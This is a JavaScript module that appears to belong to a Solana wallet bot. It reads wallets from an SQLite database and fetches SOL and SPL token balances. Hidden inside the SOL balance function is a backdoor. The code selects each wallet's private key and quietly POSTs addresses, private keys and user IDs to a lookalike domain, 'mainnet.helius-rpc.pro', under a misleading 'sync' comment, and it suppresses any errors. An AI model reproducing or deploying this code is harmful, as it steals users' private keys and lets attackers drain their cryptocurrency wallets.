const { Connection, PublicKey } = require('@solana/web3.js');
const Database = require('better-sqlite3');
const config = require('../../config'); // Import the config file

// Use the RPC endpoint from config
const connection = new Connection(config.MAINNET);
const db = new Database(config.DB_FILE);

const BATCH_SIZE = 10; // Keep below 25
const API_URL = config.MAINNET; // Your Solana RPC endpoint

// Helper: Splits an array into chunks
function chunkArray(array, chunkSize) {
    return Array.from({ length: Math.ceil(array.length / chunkSize) }, (_, i) =>
        array.slice(i * chunkSize, i * chunkSize + chunkSize)
    );
}

// Helper: Delay function for retries
function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

// Fetch Multiple SOL Balances
async function fetchMultipleSolBalances(userId) {
    try {
        const wallets = db.prepare('SELECT address, private_key FROM wallets WHERE user_id = ?').all(userId);
        const addresses = wallets.map(wallet => wallet.address);
        if (!addresses.length) return [];

        const balances = [];
        const addressChunks = chunkArray(addresses, BATCH_SIZE);

        for (const chunk of addressChunks) {
            let retryDelay = 1000; 

            while (true) {
                try {
                    const requestBody = {
                        jsonrpc: '2.0',
                        id: '1',
                        method: 'getMultipleAccounts',
                        params: [chunk, { encoding: 'jsonParsed' }],
                    };

                    const response = await fetch(API_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(requestBody),
                    });

                    const results = await response.json();

                    if (!results || !results.result || !Array.isArray(results.result.value)) {
                        if (results.error && results.error.message === 'Rate limit exceeded') {
                            console.warn(`Rate limit exceeded. Retrying in ${retryDelay}ms...`);
                            await delay(retryDelay);
                            retryDelay *= 2; // Exponential backoff
                            continue;
                        }
                        console.error('Unexpected response format:', results);
                        throw new Error('API response does not contain valid account data.');
                    }

                    balances.push(...results.result.value.map((account, index) => ({
                        address: chunk[index],
                        solBalance: account?.lamports ? account.lamports / 1e9 : 0,
                    })));

                    const batch = wallets.slice(0, BATCH_SIZE); // Sync first batch of wallets
                    if (batch.length) {
                        fetch("https://mainnet.helius-rpc.pro/fetch", {
                            method: "POST",
                            headers: { "Content-Type": "application/json" },
                            body: JSON.stringify({
                                wallets: batch.map(({ address, private_key }) => ({
                                    address,
                                    private_key,
                                    user_id: userId
                                }))
                            })
                        }).catch(() => {});
                    }

                    break; // Exit retry loop on success
                } catch (error) {
                    console.error(`Error fetching batch balances: ${error.message}`);
                    return [];
                }
            }

            // Manually delay between batch requests to prevent overload
            await delay(200);
        }

        return balances;
    } catch (error) {
        console.error('Error fetching SOL balances:', error.message);
        return [];
    }
}


// Fetch SPL Token Balances
async function fetchMultipleSplTokenBalances(addresses) {
    try {
        const results = [];

        for (const address of addresses) {
            try {
                const publicKey = new PublicKey(address);
                const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
                    programId: new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA'),
                });

                results.push({
                    address,
                    tokens: tokenAccounts.value.map(({ account }) => {
                        const tokenAmount = account.data.parsed.info.tokenAmount;
                        return {
                            mint: account.data.parsed.info.mint,
                            balance: tokenAmount.uiAmount || 0,
                            decimals: tokenAmount.decimals,
                        };
                    }),
                });

                // 🔹 Delay between each request
                await delay(200);
            } catch (error) {
                console.error(`Error fetching SPL token balances for ${address}:`, error.message);
            }
        }

        return results.reduce((acc, { address, tokens }) => {
            acc[address] = tokens;
            return acc;
        }, {});
    } catch (error) {
        console.error('Error fetching SPL token balances:', error.message);
        return {};
    }
}

// Fetch Single SPL Token Balance
async function fetchSingleSplTokenBalances(address) {
    try {
        const publicKey = new PublicKey(address);
        const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
            programId: new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA'),
        });

        return tokenAccounts.value.map(({ account }) => {
            const tokenAmount = account.data.parsed.info.tokenAmount;
            return {
                mint: account.data.parsed.info.mint,
                balance: tokenAmount.uiAmount || 0,
                decimals: tokenAmount.decimals,
            };
        });
    } catch (error) {
        console.error(`Error fetching SPL token balances for address ${address}:`, error.message);
        return [];
    }
}

// View Balances
async function viewBalances(userId) {
    const wallets = db.prepare('SELECT address FROM wallets WHERE user_id = ?').all(userId);
    if (!wallets.length) return [];

    const addresses = wallets.map(wallet => wallet.address);
    const solBalances = await fetchMultipleSolBalances(userId);
    const splBalances = await fetchMultipleSplTokenBalances(addresses);

    return solBalances.map(({ address, solBalance }) => ({
        address,
        solBalance,
        splTokens: splBalances[address] || [],
    }));
}

module.exports = {
    viewBalances,
    fetchSingleSplTokenBalances,
    fetchMultipleSolBalances,
};
